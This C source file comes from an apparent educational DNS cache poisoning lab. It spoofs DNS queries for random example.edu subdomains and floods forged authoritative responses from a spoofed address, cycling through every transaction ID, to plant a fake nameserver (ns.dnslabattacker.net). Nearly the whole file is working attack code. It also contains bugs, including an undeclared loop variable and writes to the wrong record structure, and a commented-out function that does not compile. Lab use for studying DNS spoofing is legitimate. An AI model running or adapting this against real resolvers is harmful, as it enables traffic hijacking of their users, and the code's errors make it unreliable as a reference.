// ----udp.c------
// For use with the Remote DNS Cache Poisoning Attack Lab
// Sample program used to spoof lots of different DNS queries to the victim.
//
// Wireshark can be used to study the packets, however, the DNS queries 
// sent by this program are not enough for to complete the lab.
//
// The response packet needs to be completed.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// The program must be run as root
// sudo ./udp 192.168.15.20 192.168.15.18

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400   // DNS response packet: QR:1(Server) AA:1(Authorative)
#define FLAG_Q 0x0100   // DNS question packet: QR:0(Client) RD:1(Recursion desired)

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};

struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;   // QR(1) Opcode(4) AA(1) TC(1) RD(1) RA(1) Z(3) rcode(4)
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

// The End of a Session
struct sesEnd
{
    unsigned short int type;
    unsigned short int class;
    unsigned short int ttl_l;   // lower bits
    unsigned short int ttl_u;   // upper bits
    unsigned short int datalen;    
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void responsePacket(int sd, char *dest_add);

int main(int argc, char *argv[])
{
    // This is to check the argc number
    if(argc != 3){
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }

    // socket descriptor
    int sd;

    // buffer to hold the request packet
    char buffer[PCKT_LEN];  
    // buffer to hold the response packet
    char buffer_res[PCKT_LEN];
    
    // set the request buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    // set the response buffer to 0 for all bytes
    memset(buffer_res, 0, PCKT_LEN);

    // Request-Header
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
    // Response-Header
    struct ipheader *ip_res = (struct ipheader *)buffer_res;
    struct udpheader *udp_res = (struct udpheader *)(buffer_res + sizeof(struct ipheader));
    struct dnsheader *dns_res=(struct dnsheader*)(buffer_res +sizeof(struct ipheader)+sizeof(struct udpheader));    

    // data is the pointer points to the first byte of the request dns payload
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
    // data_res is the pointer points to the first byte of the response dns payload
    char *data_res=(buffer_res +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));  
    

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

// Request-Packet
    // The flag you need to set
    dns->flags=htons(FLAG_Q);
    
    // only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);
    
    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;

    //this is for convenience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);
    
    
// Response-Packet
    // The flag you need to set
    dns_res->flags=htons(FLAG_R);
    
    // only 1 query, so the count should be one.
    dns_res->QDCOUNT=htons(1);
    // Authoritative Answer: 1 (the final answer)
    dns_res->ANCOUNT=htons(1);    
    // Name Server or Authority: 1 (an authority info)
    dns_res->NSCOUNT=htons(1);    
    // Additional Record: 2 for additional info
    dns_res->ARCOUNT=htons(2);        
    
    //query string
    strcpy(data_res,"\5aaaaa\7example\3edu");
    int length_res= strlen(data_res)+1;

    //this is for convenience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end_res=(struct dataEnd *)(data_res+length_res);
    end_res->type=htons(1);
    end_res->class=htons(1);
    length_res+=4;
    strcpy(data_res+length_res,"\xc0\x0c");
    length_res+=2;
    
    struct sesEnd * end_res_ans = (struct sesEnd *)(data_res+length_res);
    end_res_ans->type=htons(1);
    end_res_ans->class=htons(1);
    end_res_ans->ttl_l=htons(1);
    end_res_ans->ttl_u=htons(1);
    end_res_ans->datalen=htons(4);
    length_res+=10;
    
    strcpy(data_res+length_res, "\1\1\1\1");
    length_res+=4;
    
    strcpy(data_res+length_res, "\xc0\x12");
    length_res+=2;
    
    struct sesEnd * end_res_ns = (struct sesEnd *)(data_res+length_res);
    end_res_ns->type=htons(2);
    end_res_ns->class=htons(1);
    end_res_ns->ttl_l=htons(1);
    end_res_ns->ttl_u=htons(1);
    end_res_ns->datalen=htons(23);
    length_res+=10;
    
    strcpy(data_res+length_res, "\2ns\14dnslabattacker\3net");
    length_res+=23;

    strcpy(data_res+length_res, "\2ns\14dnslabattacker\3net");
    length_res+=23;
    
    struct sesEnd * end_res_add = (struct sesEnd *)(data_res+length_res);
    end_res_ns->type=htons(1);
    end_res_ns->class=htons(1);
    end_res_ns->ttl_l=htons(1);
    end_res_ns->ttl_u=htons(1);
    end_res_ns->datalen=htons(4);
    length_res+=10; 
    strcpy(data_res+length_res, "\1\1\1\1");
    length_res+=5;
        
    

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/
    
    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;   // Request
    din.sin_family = AF_INET;   // Response

    // Port numbers
    sin.sin_port = htons(33333);    // Request
    din.sin_port = htons(53);   // Response

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    
// *** IP HEADER ***
    // REQUEST
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd));
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(argv[1]);
    // The destination IP address
    ip->iph_destip = inet_addr(argv[2]);
        
    // RESPONSE
    ip_res->iph_ihl = 5;
    ip_res->iph_ver = 4;
    ip_res->iph_tos = 0; // Low delay
    unsigned short int packetLength_res =(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length_res + sizeof(struct dataEnd));
    ip_res->iph_len=htons(packetLength_res);
    ip_res->iph_ident = htons(rand()); // give a random number for the identification#
    ip_res->iph_ttl = 110; // hops
    ip_res->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip_res->iph_sourceip = inet_addr("199.43.135.53");
    // The destination IP address
    ip_res->iph_destip = inet_addr(argv[2]);    
    

// *** UDP HEADER ***
    // Request
    udp->udph_srcport = htons(40000+rand()%10000);
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));
    
    // Response
    udp_res->udph_srcport = htons(33333);
    udp_res->udph_destport = htons(53);
    udp_res->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length_res+sizeof(struct dataEnd));    
    

// *** Checksum ***
    // Request
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    // Response
    ip_res->iph_chksum = csum((unsigned short *)buffer_res, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));    
    
    /*******************************************************************************8
      Tips

      the checksum is quite important to pass integrity checking. You need 
      to study the algorithem and what part should be taken into the calculation.

      !!!!!If you change anything related to the calculation of the checksum, you need to re-
      calculate it or the packet will be dropped.!!!!!

      Here things became easier since the checksum functions are provided. You don't need
      to spend your time writing the right checksum function.
      Just for knowledge purposes,
      remember the seconed parameter
      for UDP checksum:
      ipheader_size + udpheader_size + udpData_size  
      for IP checksum: 
      ipheader_size + udpheader_size
     *********************************************************************************/

    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }

    while(1)
    {	
        // This is to generate a different query in xxxxx.example.edu
        // NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;
        *(data_res+charnumber)+=1;        

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));

        unsigned short int cnt = 65535; // count
        while(count--){
            dns_res->query_id=cnt;
            udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));
            
            if(sendto(sd, buffer_res, packetLength_res, 0, (struct sockaddr *)&din, sizeof(din)) < 0)
                printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
    }
    close(sd);
    return 0;
}

/*
void responsePacket(int sd, char *dest_addr){
    char buffer[PCKT_LEN];
    memset(buffer, 0 ,PCKT_LEN);
    
    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
    
    
    // The flag you need to set
    dns->flags=htons(FLAG_R);
    
    // Question count: the server repeats the question in the response packet so the question count is almost always 1
    dns->QDCOUNT=htons(1);

    // Authoritative Answer count should be 1 as the final answer
    dns->ANCOUNT=htons(1);
    
    // Name Server count, or Authority count, should be 1 for an authority info
    dns->NSCOUNT=htons(1);    
    
    // Additional Record count should be 2 for additional info
    dns->ARCOUNT=htons(2);    
    
    // Query String
    strcpy(data, );
    int length = strlen(data) + 1;

    // this is for convenience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data + length);
    end->type=htons(1);
    end->class=htons(1);
    
    // Answer Section
    char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length);
    
    strcpy(ans, dns_data);
    int anslength = strlen(ans) + 1;
    
    struct ansEnd *ansend = (struct ansEnd *)(ans + anslength);
    ansend->type = htons(1);
    ansend->class = htons(1);
    ansend->ttl_l = htons(0x00);
    ansend->ttl_u = htons(0xD0);
    ansend->datalen = htons(4);
    
    char *ansaddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength);
    
    strcpy(ansaddr, "\1\1\1\1");
    int addrlen = strlen(ansaddr);
    
    // Authorization section
    char *ns = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen);
    strcpy(ns, "\7example\3com");
    int nslength = strlen(ns) + 1;
    
    struct ansEnd *nsend = (struct ansEnd *)(ns + nslength);
    nsend->type = htons(2);
    nsend->class = htons(1);
    nsend->ttl_l = htons(0x00);
    nsend->ttl_u = htons(0xD0);
    nsend->datalen = htons(23);
    
    char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength);
    strcpy(nsname, "\2ns\16dnslabattacker\3net");
    int nsnamelen = strlen(nsname) + 1;
    
    // Additional Section
    char *ar = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen);
    strcpy(ar, "\2ns\16dnslabattacker\3net");
    int arlength = strlen(ar) + 1;
    struct ansEnd *arend = (struct ansEnd *)(ar + arlength);
    arend->type = htons(1);
    arend->class = htons(1);
    arend->ttl_l = htons(0x00);
    arend->ttl_u = htons(0xD0);
    arend->datalen = htons(4);
    char *araddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd));
    strcpy(araddr, "\1\1\1\1");
    int araddrlen = strlen(araddr);
    
    // End of DNS packet
    
    
    // Destination addresses: IP and port
    struct sockaddr_in sin;
    int one = 1;
    const int *val = &one;

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");

    // The address family
    sin.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(dest_addr);

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen);
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr("199.43.135.53");

    // The destination IP address
    ip->iph_destip = inet_addr(dest_addr);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(53);
    
    // Destination port number
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen);

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }
    
    unsigned short int co = 65535;
    while(co--){
        dns->query_id = co;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("Packet send error %d which means %s\n", errno, strerror(errno));
        count++;
    }

    close(sd);

    
}
*/
